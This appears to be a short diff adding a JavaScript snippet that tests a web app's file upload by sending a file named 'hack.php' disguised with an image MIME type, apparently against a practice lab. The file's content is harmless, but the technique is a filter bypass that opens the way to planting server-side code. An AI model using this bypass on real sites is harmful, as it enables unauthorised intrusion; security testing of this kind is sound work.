@@ -1,0 +1,11 @@
+const formData = new FormData();
+const file = new File(["just a test"], "hack.php", { type: "image/jpeg" });
+formData.append('uploaded', file);
+formData.append('Upload', 'Upload');
+
+fetch('?page=upload', {
+method: 'POST',
+body: formData
+}).then(r => r.text()).then(html => {
+document.body.innerHTML = html;
+});
